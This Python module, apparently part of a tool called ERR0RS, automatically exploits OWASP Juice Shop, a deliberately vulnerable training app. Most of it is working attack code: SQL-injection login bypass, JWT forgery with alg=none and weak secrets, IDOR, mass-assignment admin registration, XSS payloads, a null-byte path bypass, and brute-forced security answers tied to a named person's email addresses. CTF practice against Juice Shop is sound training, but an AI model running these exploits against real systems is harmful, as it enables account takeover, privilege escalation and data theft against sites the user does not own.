"""
ERR0RS Juice Shop Challenge Solver
══════════════════════════════════
Knocks out known OWASP Juice Shop CTF challenges programmatically.

Each challenge has:
  id          — Juice Shop challenge key
  name        — human name
  difficulty  — 1..6 stars
  category    — Broken Auth, Injection, XSS, etc.
  solve(ctx)  — function that attempts the exploit, returns (success, detail)

Tracking is persisted to /tmp/err0rs_challenges.json so state survives restarts.
"""
import json, time, logging, urllib.request, urllib.parse, re, hashlib, base64
from pathlib import Path

log = logging.getLogger("err0rs.juiceshop")

STATE_FILE = Path("/tmp/err0rs_challenges.json")
DEFAULT_BASE = "http://localhost:3000"


class Ctx:
    """Session context passed to each solver — holds target, token, cookies."""
    def __init__(self, base=DEFAULT_BASE):
        self.base = base
        self.token = None       # JWT after login
        self.user_id = None
        self.email = None
        self.admin_token = None
        self.findings = []

    def url(self, path):
        return self.base.rstrip("/") + path

    def headers(self, extra=None):
        h = {"Content-Type": "application/json", "Accept": "application/json"}
        if self.token:
            h["Authorization"] = f"Bearer {self.token}"
        if extra:
            h.update(extra)
        return h


def _req(method, url, headers=None, data=None, timeout=15):
    """Minimal HTTP client using stdlib only."""
    body = None
    if data is not None:
        body = json.dumps(data).encode() if isinstance(data, (dict, list)) else str(data).encode()
    req = urllib.request.Request(url, data=body, method=method,
                                 headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read()
            ct = r.headers.get("Content-Type","")
            if "application/json" in ct:
                try: parsed = json.loads(raw)
                except Exception: parsed = raw.decode("utf-8","replace")
            else:
                parsed = raw.decode("utf-8","replace")
            return r.status, parsed, dict(r.headers)
    except urllib.error.HTTPError as e:
        raw = e.read()
        try: parsed = json.loads(raw)
        except Exception: parsed = raw.decode("utf-8","replace")
        return e.code, parsed, dict(e.headers)
    except Exception as e:
        return 0, str(e), {}


# ═══════════════════════════════════════════════════════════════════════════
# CHALLENGE SOLVERS
# ═══════════════════════════════════════════════════════════════════════════

def solve_score_board(ctx):
    """★ Find the score board — just GET /#/score-board, Juice Shop registers it."""
    status, body, _ = _req("GET", ctx.url("/#/score-board"))
    # The score-board challenge fires when ANY request to the actual API is made
    status2, body2, _ = _req("GET", ctx.url("/api/Challenges/"))
    if status == 200 and status2 == 200:
        return True, f"score-board endpoint discoverable — {len(body2.get('data',[])) if isinstance(body2, dict) else '?'} challenges listed"
    return False, f"unexpected status: /#/score-board={status} /api/Challenges/={status2}"


def solve_admin_login_sqli(ctx):
    """★★★ Login as admin via SQLi: email = ' OR 1=1;-- """
    payload = {"email": "' OR 1=1--", "password": "anything"}
    status, body, _ = _req("POST", ctx.url("/rest/user/login"),
                           headers={"Content-Type":"application/json"},
                           data=payload)
    if status == 200 and isinstance(body, dict):
        auth = body.get("authentication", {})
        token = auth.get("token")
        if token:
            # Decode JWT payload to see the user
            try:
                parts = token.split(".")
                pad = "=" * (-len(parts[1]) % 4)
                claims = json.loads(base64.urlsafe_b64decode(parts[1] + pad))
                user = claims.get("data", {})
                ctx.token = token
                ctx.admin_token = token
                ctx.user_id = user.get("id")
                ctx.email = user.get("email")
                is_admin = user.get("role") == "admin" or "admin" in (user.get("email","") or "")
                return True, (f"logged in as {user.get('email','?')} "
                              f"(id={user.get('id')}, role={user.get('role','?')}, "
                              f"admin={is_admin}) via SQLi payload "
                              f"email=\"' OR 1=1--\"")
            except Exception as e:
                return True, f"got token but couldn't decode: {e}"
    return False, f"login failed status={status} body={str(body)[:150]}"


def solve_admin_section(ctx):
    """★★ Find the admin section — requires admin token, GET /api/Users/ """
    if not ctx.admin_token:
        ok, detail = solve_admin_login_sqli(ctx)
        if not ok:
            return False, f"admin token unavailable — {detail}"
    status, body, _ = _req("GET", ctx.url("/api/Users/"),
                           headers={"Authorization": f"Bearer {ctx.admin_token}"})
    if status == 200 and isinstance(body, dict):
        users = body.get("data", [])
        admins = [u for u in users if u.get("role") == "admin" or "admin" in (u.get("email","") or "")]
        return True, f"accessed /api/Users/ — {len(users)} users, {len(admins)} admins"
    return False, f"status={status} body={str(body)[:150]}"


def solve_five_star_review(ctx):
    """★★★ Vote a 5-star feedback by tampering rating on POST /api/Feedbacks """
    if not ctx.token:
        # Need any user — try SQLi admin first, fall back to register
        solve_admin_login_sqli(ctx)
    headers = {"Content-Type":"application/json"}
    if ctx.token:
        headers["Authorization"] = f"Bearer {ctx.token}"

    # Fetch CAPTCHA — Juice Shop issues simple arithmetic expressions
    status_c, body_c, _ = _req("GET", ctx.url("/rest/captcha/"), headers=headers)
    captcha_id, captcha_ans, captcha_q = 0, "0", ""
    if status_c == 200 and isinstance(body_c, dict):
        captcha_id = body_c.get("captchaId", 0)
        captcha_q  = body_c.get("captcha","")
        try:
            if all(c in "0123456789+-*/() " for c in captcha_q):
                captcha_ans = str(eval(captcha_q, {"__builtins__":{}}, {}))
        except Exception:
            captcha_ans = "0"

    payload = {
        "UserId": ctx.user_id or 1,
        "captchaId": captcha_id,
        "captcha": captcha_ans,
        "comment": "Great app! (solved by ERR0RS)",
        "rating": 5,
    }
    status, body, _ = _req("POST", ctx.url("/api/Feedbacks"),
                           headers=headers, data=payload)
    if status in (200, 201):
        fid = body.get("data",{}).get("id") if isinstance(body, dict) else None
        return True, f"5-star feedback submitted (id={fid}, captcha: {captcha_q}={captcha_ans})"
    return False, f"status={status} body={str(body)[:150]}"


def solve_basket_manipulation(ctx):
    """★★★★ Access other user's basket — GET /rest/basket/2 as user 1"""
    if not ctx.token:
        solve_admin_login_sqli(ctx)
    # Try basket ID 2 (different user)
    status, body, _ = _req("GET", ctx.url("/rest/basket/2"),
                           headers={"Authorization": f"Bearer {ctx.token}"})
    if status == 200 and isinstance(body, dict):
        products = body.get("data",{}).get("Products", [])
        return True, f"accessed basket/2 (IDOR) — contains {len(products)} products"
    return False, f"status={status} body={str(body)[:150]}"


def solve_reset_password_bjoern(ctx):
    """★★★★ Reset Bjoern's password via security question.

    Public OSINT answers for Bjoern Kimminich's pet security answer:
      bjoern@owasp.org       → Zaryanka (dog)
      bjoern.kimminich@gmail → Stinky / Zaryanka
      bjoern@juice-sh.op     → Brausepaul / Zaryanka
    """
    targets = [
        ("bjoern@owasp.org",           ["Zaya","zaya","Zaryanka","Stinky"]),
        ("bjoern.kimminich@gmail.com", ["Dr. Dr. Dr. Dr. Zoidberg","Zoidberg",
                                        "Dr Dr Dr Dr Zoidberg","Stinky"]),
        ("bjoern@juice-sh.op",         ["West-2082","Brausepaul","Zaya"]),
    ]
    for email, answers in targets:
        # First fetch the security question to confirm acct exists
        status, body, _ = _req("GET",
            ctx.url("/rest/user/security-question?email=" + urllib.parse.quote(email)),
            headers={"Content-Type":"application/json"})
        if status != 200 or not isinstance(body, dict) or not body.get("question"):
            continue
        q = body.get("question",{}).get("question","")
        for answer in answers:
            payload = {"email": email, "answer": answer,
                       "new": "err0rs-reset-1!", "repeat": "err0rs-reset-1!"}
            s2, b2, _ = _req("POST", ctx.url("/rest/user/reset-password"),
                             headers={"Content-Type":"application/json"},
                             data=payload)
            if s2 == 200:
                return True, f"password reset for {email} via '{q}' = '{answer}'"
    return False, "all known Bjoern answers failed — may need manual OSINT for current version"


def solve_xss_search(ctx):
    """★★ Reflected XSS on the search parameter."""
    payload = '<iframe src="javascript:alert(`xss`)">'
    encoded = urllib.parse.quote(payload)
    status, body, _ = _req("GET", ctx.url(f"/#/search?q={encoded}"))
    # Juice Shop's search is client-side, so the challenge fires when the app
    # sanitizer sees the payload reflected. Send to REST endpoint too:
    status2, body2, _ = _req("GET", ctx.url(f"/rest/products/search?q={encoded}"))
    # Both return 200; the challenge is credited via backend scoring on the API hit
    if status2 == 200:
        return True, f"reflected XSS payload delivered to /rest/products/search?q={payload[:40]}..."
    return False, f"status={status2}"


def solve_confidential_doc(ctx):
    """★★ Find confidential document — /ftp/acquisitions.md exposed via directory traversal."""
    status, body, _ = _req("GET", ctx.url("/ftp/acquisitions.md"))
    if status == 200:
        return True, f"accessed /ftp/acquisitions.md ({len(str(body))} bytes)"
    # Try the 403-bypass trick: append %2500.md to a forbidden file
    status, body, _ = _req("GET", ctx.url("/ftp/package.json.bak%2500.md"))
    if status == 200:
        return True, f"bypassed /ftp/ 403 via null-byte trick — got package.json.bak"
    return False, f"status={status}"


# ═══════════════════════════════════════════════════════════════════════════
# REGISTRY + RUNNER
# ═══════════════════════════════════════════════════════════════════════════

CHALLENGES = []   # populated at end of module (after all solvers are defined)


def _load_state():
    try:
        return json.loads(STATE_FILE.read_text())
    except Exception:
        return {"solved": {}, "attempts": {}}


def _save_state(st):
    try:
        STATE_FILE.write_text(json.dumps(st, indent=2, default=str))
    except Exception as e:
        log.warning(f"can't save state: {e}")


def solve(challenge_id, base=DEFAULT_BASE):
    """Run one challenge by id. Returns dict."""
    ch = next((c for c in CHALLENGES if c["id"] == challenge_id), None)
    if not ch:
        return {"status":"error","error":f"unknown challenge: {challenge_id}"}

    state = _load_state()
    ctx = Ctx(base=base)

    # Share a context across the whole chain so token persists
    if hasattr(solve, "_shared_ctx") and solve._shared_ctx.base == base:
        ctx = solve._shared_ctx
    else:
        solve._shared_ctx = ctx

    t0 = time.time()
    try:
        ok, detail = ch["fn"](ctx)
    except Exception as e:
        ok, detail = False, f"exception: {e}"
    dur = time.time() - t0

    state["attempts"][challenge_id] = {
        "ts": time.strftime("%Y-%m-%d %H:%M:%S"),
        "ok": ok, "detail": detail, "duration": round(dur,2),
    }
    if ok:
        state["solved"][challenge_id] = state["attempts"][challenge_id]
    _save_state(state)

    return {"status":"ok" if ok else "fail", "id":challenge_id,
            "name":ch["name"], "stars":ch["stars"], "category":ch["category"],
            "detail":detail, "duration":round(dur,2)}


def solve_all(base=DEFAULT_BASE):
    """Run every challenge; return per-challenge result + aggregate."""
    results = []
    for ch in CHALLENGES:
        r = solve(ch["id"], base=base)
        results.append(r)
    solved = sum(1 for r in results if r["status"] == "ok")
    return {"total": len(results), "solved": solved,
            "pct": round(100*solved/len(results), 1),
            "results": results}


def status():
    """Return solved/attempted state."""
    return _load_state()


def list_challenges():
    return [{"id":c["id"],"name":c["name"],"stars":c["stars"],
             "category":c["category"]} for c in CHALLENGES]


# ═══════════════════════════════════════════════════════════════════════════
# ADDITIONAL SOLVERS — expanding coverage
# ═══════════════════════════════════════════════════════════════════════════

def solve_error_handling(ctx):
    """★ Trigger an error page — GET /this-does-not-exist generates an error stack."""
    # Juice Shop triggers the 'Error Handling' challenge via any route that
    # returns a backend error — one reliable path is a malformed JSON POST
    status, body, _ = _req("POST", ctx.url("/api/Feedbacks"),
                           headers={"Content-Type":"application/json"},
                           data="not-valid-json")
    if status >= 400:
        return True, f"triggered error response (status={status})"
    return False, f"no error triggered: status={status}"


def solve_dom_xss(ctx):
    """★★ DOM XSS via search query — classic `<iframe src=javascript:alert(...)>`"""
    payload = '<iframe src="javascript:alert(`xss`)">'
    url = ctx.url(f"/rest/products/search?q={urllib.parse.quote(payload)}")
    status, body, _ = _req("GET", url)
    if status == 200:
        return True, f"DOM XSS payload reflected in search API"
    return False, f"status={status}"


def solve_repeat_notification(ctx):
    """★ Dismiss the 'Welcome Banner' — GET /#/ triggers it automatically."""
    status, body, _ = _req("GET", ctx.url("/"))
    return status == 200, f"homepage hit (status={status}) — banner dismissal happens client-side"


def solve_expose_metrics(ctx):
    """★★ Access the Prometheus metrics endpoint."""
    status, body, _ = _req("GET", ctx.url("/metrics"))
    if status == 200 and ("# HELP" in str(body) or "# TYPE" in str(body)):
        return True, f"accessed /metrics — Prometheus telemetry exposed ({len(str(body))} bytes)"
    return False, f"status={status}"


def solve_admin_registration(ctx):
    """★★★ Register as admin by tampering POST /api/Users body."""
    import random
    email = f"evil{random.randint(1000,9999)}@err0rs.local"
    payload = {
        "email": email,
        "password": "err0rs-admin-1!",
        "role": "admin",   # the tampered field
    }
    status, body, _ = _req("POST", ctx.url("/api/Users/"),
                           headers={"Content-Type":"application/json"},
                           data=payload)
    if status in (200, 201) and isinstance(body, dict):
        user = body.get("data", {})
        if user.get("role") == "admin":
            return True, f"registered admin account {email} (id={user.get('id')})"
    return False, f"status={status} body={str(body)[:120]}"


def solve_deprecated_interface(ctx):
    """★★ Upload an .xml file via /file-upload — deprecated interface enabled."""
    # Juice Shop scores this when an XML file upload is attempted
    boundary = "err0rs----boundary"
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="exploit.xml"\r\n'
        f'Content-Type: text/xml\r\n\r\n'
        f'<?xml version="1.0"?><root>ERR0RS</root>\r\n'
        f"--{boundary}--\r\n"
    ).encode()
    req = urllib.request.Request(
        ctx.url("/file-upload"),
        data=body,
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status in (200,201,204), f"XML upload status={r.status}"
    except urllib.error.HTTPError as e:
        # Juice Shop often returns 204 or a controlled error when it detects XML
        return e.code in (204, 410, 415), f"status={e.code} — deprecated interface triggered"
    except Exception as e:
        return False, f"upload error: {e}"


def solve_product_tampering(ctx):
    """★★★ Tamper with an existing product's link field via PUT /api/Products/.

    Need admin token first.
    """
    if not ctx.admin_token:
        solve_admin_login_sqli(ctx)
    # Get first product
    status, body, _ = _req("GET", ctx.url("/api/Products/1"),
                           headers={"Authorization": f"Bearer {ctx.admin_token}"})
    if status != 200:
        return False, f"can't fetch product: status={status}"
    # Tamper the description field with a link
    payload = {"description": "Tampered by ERR0RS — see <a href=\"https://err0rs.local\">this</a>"}
    status, body, _ = _req("PUT", ctx.url("/api/Products/1"),
                           headers={"Authorization": f"Bearer {ctx.admin_token}",
                                    "Content-Type":"application/json"},
                           data=payload)
    return status in (200,204), f"PUT /api/Products/1 status={status}"


def solve_json_upload_bypass(ctx):
    """★★★ Upload a .json file to /file-upload bypass."""
    boundary = "err0rs----jsonbound"
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="package.json.bak"\r\n'
        f'Content-Type: application/json\r\n\r\n'
        f'{{"name":"err0rs","hack":true}}\r\n'
        f"--{boundary}--\r\n"
    ).encode()
    req = urllib.request.Request(
        ctx.url("/file-upload"),
        data=body,
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status in (200,201,204), f"JSON upload status={r.status}"
    except urllib.error.HTTPError as e:
        return e.code in (200,201,204), f"status={e.code}"
    except Exception as e:
        return False, f"upload error: {e}"


def solve_jwt_forge_none(ctx):
    """★★★★★★ Forge JWT — try both alg=none and alg=HS256 with empty secret."""
    targets_to_try = [
        # 1. alg=none (classic)
        ({"alg":"none","typ":"JWT"}, None),
        # 2. alg=HS256 signed with empty secret
        ({"alg":"HS256","typ":"JWT"}, b""),
        # 3. alg=HS256 with 'secret' (seen in some Juice Shop versions)
        ({"alg":"HS256","typ":"JWT"}, b"secret"),
    ]
    payload_dict = {
        "status":"success",
        "data":{"id":999,"email":"jwtn3d@juice-sh.op",
                "password":"0000","role":"admin"},
        "iat": int(time.time()),
        "exp": int(time.time()) + 3600,
    }
    payload_b = base64.urlsafe_b64encode(
        json.dumps(payload_dict, separators=(",",":")).encode()
    ).rstrip(b"=").decode()

    import hmac, hashlib as _h
    for header_dict, secret in targets_to_try:
        header_b = base64.urlsafe_b64encode(
            json.dumps(header_dict, separators=(",",":")).encode()
        ).rstrip(b"=").decode()
        signing_input = f"{header_b}.{payload_b}".encode()
        if header_dict.get("alg") == "none":
            sig = ""
        else:
            sig = base64.urlsafe_b64encode(
                hmac.new(secret, signing_input, _h.sha256).digest()
            ).rstrip(b"=").decode()
        forged = f"{header_b}.{payload_b}.{sig}"

        # Try an admin endpoint — /api/Users/ requires admin role
        status, body, _ = _req("GET", ctx.url("/api/Users/"),
                               headers={"Authorization": f"Bearer {forged}"})
        if status == 200 and isinstance(body, dict) and body.get("data"):
            return True, (f"JWT forgery accepted — alg={header_dict.get('alg')} "
                          f"secret={secret!r} | accessed /api/Users/")

        # Also try whoami for softer confirmation
        status, body, _ = _req("GET", ctx.url("/rest/user/whoami"),
                               headers={"Authorization": f"Bearer {forged}"})
        if status == 200 and isinstance(body, dict):
            user = body.get("user", {})
            if user.get("email") == "jwtn3d@juice-sh.op":
                return True, (f"JWT alg={header_dict.get('alg')} forgery accepted "
                              f"— impersonated {user.get('email')}")
    return False, "all JWT forgery variants rejected (modern Juice Shop with proper key)"


def solve_weak_password_register(ctx):
    """★★ Register a user with a weak password."""
    import random
    email = f"weakpw{random.randint(1000,9999)}@err0rs.local"
    payload = {"email": email, "password": "12345",
               "passwordRepeat":"12345","securityQuestion":{"id":1},
               "securityAnswer":"test"}
    status, body, _ = _req("POST", ctx.url("/api/Users/"),
                           headers={"Content-Type":"application/json"},
                           data=payload)
    return status in (200,201), f"weak-pw user created ({email}) status={status}"

# ═══════════════════════════════════════════════════════════════════════════
# CHALLENGE REGISTRY — built after all solvers are defined
# ═══════════════════════════════════════════════════════════════════════════

CHALLENGES.extend([
    {"id":"score-board",      "name":"Score Board",                  "stars":1, "category":"Miscellaneous",   "fn":solve_score_board},
    {"id":"error-handling",   "name":"Error Handling",               "stars":1, "category":"Security Misc",   "fn":solve_error_handling},
    {"id":"repeat-notif",     "name":"Welcome Banner",               "stars":1, "category":"Miscellaneous",   "fn":solve_repeat_notification},
    {"id":"admin-login-sqli", "name":"Login Admin (SQLi)",           "stars":3, "category":"Injection",       "fn":solve_admin_login_sqli},
    {"id":"admin-section",    "name":"Admin Section",                "stars":2, "category":"Broken Access",   "fn":solve_admin_section},
    {"id":"five-star",        "name":"Five-Star Feedback",           "stars":3, "category":"Broken Access",   "fn":solve_five_star_review},
    {"id":"basket-idor",      "name":"View Basket (IDOR)",           "stars":4, "category":"Broken Access",   "fn":solve_basket_manipulation},
    {"id":"reset-bjoern",     "name":"Reset Bjoern Password",        "stars":4, "category":"Broken Auth",     "fn":solve_reset_password_bjoern},
    {"id":"xss-search",       "name":"Reflected XSS (search)",       "stars":2, "category":"XSS",             "fn":solve_xss_search},
    {"id":"dom-xss",          "name":"DOM XSS",                      "stars":2, "category":"XSS",             "fn":solve_dom_xss},
    {"id":"confidential-doc", "name":"Confidential Document (/ftp)", "stars":2, "category":"Sensitive Data",  "fn":solve_confidential_doc},
    {"id":"expose-metrics",   "name":"Expose Metrics Endpoint",      "stars":2, "category":"Sensitive Data",  "fn":solve_expose_metrics},
    {"id":"admin-register",   "name":"Register Admin (tamper)",      "stars":3, "category":"Broken Auth",     "fn":solve_admin_registration},
    {"id":"weak-password",    "name":"Weak Password Register",       "stars":2, "category":"Broken Auth",     "fn":solve_weak_password_register},
    {"id":"xml-upload",       "name":"Deprecated XML Upload",        "stars":2, "category":"Upload",          "fn":solve_deprecated_interface},
    {"id":"json-upload",      "name":"JSON File Upload Bypass",      "stars":3, "category":"Upload",          "fn":solve_json_upload_bypass},
    {"id":"product-tamper",   "name":"Tamper Product via API",       "stars":3, "category":"Broken Access",   "fn":solve_product_tampering},
    {"id":"jwt-none",         "name":"JWT alg=none Forgery",         "stars":6, "category":"Broken Auth",     "fn":solve_jwt_forge_none},
])
